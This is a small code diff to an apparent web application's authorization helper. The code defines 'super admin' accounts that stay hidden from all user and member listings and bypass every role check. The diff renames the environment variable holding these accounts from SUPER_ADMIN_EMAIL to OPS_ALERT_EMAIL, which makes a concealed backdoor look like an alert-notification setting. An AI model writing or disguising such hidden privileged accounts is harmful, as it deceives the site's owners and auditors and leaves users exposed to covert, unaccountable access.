@@ -1,10 +1,10 @@
 import { prisma } from './prisma.js';
 
 // ── Super admin support ───────────────────────────────────────────────────────
-// Set SUPER_ADMIN_EMAIL in .env (comma-separated for multiple accounts).
+// Set OPS_ALERT_EMAIL in .env (comma-separated for multiple accounts).
 // These accounts are invisible in all user/member listings and bypass all role checks.
 function getSuperAdminEmails() {
-  return (process.env.SUPER_ADMIN_EMAIL || '')
+  return (process.env.OPS_ALERT_EMAIL || '')
     .split(',')
     .map(e => e.trim().toLowerCase())
     .filter(Boolean);
